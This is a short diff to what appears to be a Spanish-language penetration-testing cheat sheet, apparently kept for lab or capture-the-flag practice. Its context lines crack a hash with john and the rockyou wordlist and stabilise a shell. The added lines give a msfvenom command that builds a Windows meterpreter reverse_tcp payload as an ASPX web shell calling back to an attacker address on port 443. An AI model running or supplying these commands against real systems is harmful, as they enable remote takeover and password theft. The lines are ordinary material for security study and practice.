@@ -85,6 +85,9 @@ ssh2jhon.py
 ####decifrar hash #####
 john -w:<ruta rockyou.txt> hash
 
+######## reverseshell msfvenom ########
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.32 LPORT=443 -f aspx -o shell2.aspx
+
 ######## mejorar bash ######## 
 >script /dev/null -c bash
 crtl + z
